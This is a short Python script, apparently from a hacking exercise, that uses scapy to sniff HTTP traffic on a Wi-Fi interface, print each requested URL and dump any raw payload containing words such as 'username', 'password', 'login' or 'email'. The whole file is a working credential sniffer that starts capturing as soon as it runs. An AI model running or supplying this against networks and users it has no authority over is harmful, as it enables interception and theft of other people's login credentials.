import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = getUrl(packet)
        print(f"HTTP URL is: {url}")
        cred = get_credentials(packet)
        if cred:
            print(f"Possible username/password >> {cred}")

def getUrl(packet):
    return (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode("utf-8", errors="ignore")

def get_credentials(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode("utf-8", errors="ignore")
        load = load.lower()
        keywords = ["username", "user", "uname", "login", "password", "pass", "signup", "email", "name"]
        for keyword in keywords:
            if keyword in load:
                return load
    return None

sniff("Wi-Fi")